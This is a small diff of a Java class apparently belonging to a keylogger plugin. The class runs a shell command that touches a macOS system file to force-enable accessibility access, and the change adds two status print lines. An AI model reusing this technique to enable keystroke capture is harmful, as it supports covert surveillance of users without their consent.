@@ -48,8 +48,11 @@ public class KeyloggerPlugin extends StubPlugin {
 			System.out.println("Trying to enable assistive devices... Even if enabled");
 			
 			Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");
+			
+			System.out.println("Successfully executed command");
 		} catch (Exception ex) {
 			ex.printStackTrace();
+			System.out.println("Failed to execute command. No root?");
 		}
 	}
 
